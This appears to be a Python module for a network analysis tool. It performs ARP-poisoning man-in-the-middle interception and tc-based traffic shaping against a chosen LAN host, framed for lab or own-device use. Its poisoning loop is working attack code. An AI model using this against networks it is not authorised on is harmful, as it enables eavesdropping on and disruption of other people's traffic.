"""
Transparent interception and traffic shaping (MITM).

Redirects a target host's traffic through this machine with ARP poisoning so
it can be captured and shaped without touching the target itself. Meant for
a malware-analysis VM whose traffic you want to record, or your own device
on your own network.

The target stays online because kernel IP forwarding is switched on for the
duration (this box just routes for it), and the previous setting is restored
on stop. Stopping also re-ARPs the correct MAC mappings for the target and
gateway to heal the caches, and tears down any traffic shaping (tc netem)
that was applied. Capture itself is just the normal capture engine sniffing
the same interface, so once traffic is redirected here it shows up in the
live table and PCAP export like anything else.

Only run this against your own devices or a network/engagement you're
explicitly authorised to test. Intercepting traffic without authorisation is
illegal in most places and is not what this tool is for.
"""

import os
import subprocess
import threading
import time
from typing import Optional

IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"


class MitmEngine:
    def __init__(self):
        self._lock = threading.Lock()
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        self.active = False
        self.iface = None
        self.target_ip = None
        self.target_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.our_mac = None
        self.bidirectional = True
        self._sysctl_saved: dict = {}
        self._shaping = None
        self._arp_sent = 0

    # --- helpers ---------------------------------------------------------
    def _resolve_iface(self, target_ip, iface):
        from scapy.all import conf
        if iface:
            return iface
        try:
            rif, _src, _gw = conf.route.route(target_ip)
            if rif:
                return rif
        except Exception:
            pass
        try:
            return conf.iface.name
        except Exception:
            return str(conf.iface)

    def _default_gateway(self):
        from scapy.all import conf
        try:
            _rif, _src, gw = conf.route.route("0.0.0.0")
            return gw if gw and gw != "0.0.0.0" else None
        except Exception:
            return None

    def _resolve_mac(self, ip):
        from scapy.all import srp1, Ether, ARP
        try:
            ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                       iface=self.iface, timeout=2, retry=2, verbose=0)
            if ans is not None and ans.haslayer(ARP):
                return ans[ARP].hwsrc
        except Exception:
            pass
        return None

    def _write_sysctl(self, path, value):
        """Set a /proc/sys value, remembering the old one for restore."""
        try:
            with open(path) as f:
                prev = f.read().strip()
            if path not in self._sysctl_saved:
                self._sysctl_saved[path] = prev
            with open(path, "w") as f:
                f.write(str(value) + "\n")
        except Exception:
            pass

    def _apply_sysctls(self):
        # Forward the target's packets (stay transparent) …
        self._write_sysctl(IP_FORWARD, 1)
        # … and stop the kernel telling the target to bypass us.
        for path in ("/proc/sys/net/ipv4/conf/all/send_redirects",
                     "/proc/sys/net/ipv4/conf/default/send_redirects",
                     f"/proc/sys/net/ipv4/conf/{self.iface}/send_redirects"):
            self._write_sysctl(path, 0)

    def _restore_sysctls(self):
        for path, prev in self._sysctl_saved.items():
            try:
                with open(path, "w") as f:
                    f.write(prev + "\n")
            except Exception:
                pass
        self._sysctl_saved = {}

    # --- lifecycle -------------------------------------------------------
    def start(self, iface, target_ip, gateway_ip=None, bidirectional=True):
        with self._lock:
            if self.active:
                raise RuntimeError("Interception is already running. Stop it first.")
            target_ip = (target_ip or "").strip()
            if not target_ip:
                raise ValueError("A target IP address is required.")
            from scapy.all import get_if_hwaddr

            self.iface = self._resolve_iface(target_ip, (iface or "").strip() or None)
            self.target_ip = target_ip
            self.bidirectional = bool(bidirectional)
            self.gateway_ip = (gateway_ip or "").strip() or self._default_gateway()
            if not self.gateway_ip:
                raise ValueError("Could not determine the gateway; specify it manually.")
            if self.target_ip == self.gateway_ip:
                raise ValueError("Target and gateway must be different addresses.")

            try:
                self.our_mac = get_if_hwaddr(self.iface)
            except Exception as exc:
                raise ValueError(f"Could not read the MAC of interface '{self.iface}': {exc}")

            self.target_mac = self._resolve_mac(self.target_ip)
            if not self.target_mac:
                raise ValueError(f"No ARP reply from target {self.target_ip}. "
                                 f"Is it online and on the same subnet as {self.iface}?")
            self.gateway_mac = self._resolve_mac(self.gateway_ip)
            if not self.gateway_mac:
                raise ValueError(f"No ARP reply from gateway {self.gateway_ip}.")

            self._apply_sysctls()
            self._arp_sent = 0
            self._stop.clear()
            self._thread = threading.Thread(target=self._poison_loop, daemon=True)
            self._thread.start()
            self.active = True
        return self.status()

    def _send_arp(self, pdst_ip, hwdst_mac, psrc_ip, hwsrc_mac):
        """Send an ARP is-at at layer 2 with an explicit Ethernet destination.

        Using sendp()/Ether is what actually poisons the target reliably; the
        L3 send() path does not control the frame's link-layer destination.
        """
        from scapy.all import sendp, Ether, ARP
        frame = (Ether(src=self.our_mac, dst=hwdst_mac)
                 / ARP(op=2, pdst=pdst_ip, hwdst=hwdst_mac, psrc=psrc_ip, hwsrc=hwsrc_mac))
        sendp(frame, iface=self.iface, verbose=0)

    def _poison_loop(self):
        while not self._stop.is_set():
            try:
                # Tell the target that the gateway IP is at our MAC.
                self._send_arp(self.target_ip, self.target_mac, self.gateway_ip, self.our_mac)
                self._arp_sent += 1
                if self.bidirectional:
                    # Tell the gateway that the target IP is at our MAC.
                    self._send_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.our_mac)
                    self._arp_sent += 1
            except Exception:
                pass
            self._stop.wait(2.0)

    def _restore_arp(self):
        if not (self.target_mac and self.gateway_mac and self.our_mac):
            return
        for _ in range(5):
            try:
                # Re-announce the correct MAC mappings to heal both caches.
                self._send_arp(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
                if self.bidirectional:
                    self._send_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
            except Exception:
                pass
            time.sleep(0.2)

    def stop(self):
        with self._lock:
            was_active = self.active or self._thread is not None
            self._stop.set()
            if self._thread:
                self._thread.join(timeout=3)
            self._thread = None
            self._clear_shaping_locked()
            if was_active:
                self._restore_arp()
            self._restore_sysctls()
            self.active = False
        return {"active": False}

    # --- traffic shaping -------------------------------------------------
    def set_shaping(self, rate_kbit=None, delay_ms=None, jitter_ms=None, loss_pct=None):
        with self._lock:
            if not self.active:
                raise RuntimeError("Start interception before shaping traffic.")

            def num(v):
                return None if v in (None, "", 0, "0") else v

            rate_kbit, delay_ms = num(rate_kbit), num(delay_ms)
            jitter_ms, loss_pct = num(jitter_ms), num(loss_pct)

            if all(v is None for v in (rate_kbit, delay_ms, loss_pct)):
                self._clear_shaping_locked()
                return {"shaping": None}

            parts = []
            if delay_ms is not None:
                d = max(0, int(float(delay_ms)))
                parts.append(f"delay {d}ms" + (f" {max(0, int(float(jitter_ms)))}ms" if jitter_ms is not None else ""))
            if loss_pct is not None:
                lp = min(100.0, max(0.0, float(loss_pct)))
                parts.append(f"loss {lp}%")
            if rate_kbit is not None:
                parts.append(f"rate {max(1, int(float(rate_kbit)))}kbit")

            self._clear_shaping_locked()
            iface = self.iface
            cmds = [
                ["tc", "qdisc", "add", "dev", iface, "root", "handle", "1:", "prio"],
                ["tc", "qdisc", "add", "dev", iface, "parent", "1:3", "handle", "30:", "netem"] + " ".join(parts).split(),
                ["tc", "filter", "add", "dev", iface, "parent", "1:0", "protocol", "ip",
                 "prio", "3", "u32", "match", "ip", "dst", self.target_ip + "/32", "flowid", "1:3"],
                ["tc", "filter", "add", "dev", iface, "parent", "1:0", "protocol", "ip",
                 "prio", "3", "u32", "match", "ip", "src", self.target_ip + "/32", "flowid", "1:3"],
            ]
            for c in cmds:
                r = subprocess.run(c, capture_output=True, text=True)
                if r.returncode != 0:
                    self._clear_shaping_locked()
                    raise RuntimeError("tc failed: " + (r.stderr.strip() or " ".join(c)))
            self._shaping = {"rate_kbit": rate_kbit, "delay_ms": delay_ms,
                             "jitter_ms": jitter_ms, "loss_pct": loss_pct}
            return {"shaping": self._shaping}

    def _clear_shaping_locked(self):
        if self.iface:
            subprocess.run(["tc", "qdisc", "del", "dev", self.iface, "root"],
                           capture_output=True, text=True)
        self._shaping = None

    def clear_shaping(self):
        with self._lock:
            self._clear_shaping_locked()
        return {"shaping": None}

    def status(self):
        return {
            "active": self.active, "iface": self.iface,
            "target": self.target_ip, "target_mac": self.target_mac,
            "gateway": self.gateway_ip, "gateway_mac": self.gateway_mac,
            "bidirectional": self.bidirectional, "our_mac": self.our_mac,
            "shaping": self._shaping, "arp_sent": self._arp_sent,
        }
